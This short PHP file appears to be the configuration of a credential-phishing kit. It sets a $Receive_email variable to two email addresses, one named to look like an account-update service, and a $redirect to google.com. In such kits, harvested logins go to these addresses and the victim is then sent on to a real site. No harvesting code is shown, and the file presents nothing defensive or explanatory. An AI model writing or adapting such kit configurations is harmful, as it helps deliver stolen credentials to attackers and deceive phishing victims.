<?php 
$Receive_email="lfraley692@gmail.com, accountupdate9881@pm.me";
$redirect="https://www.google.com/";
?>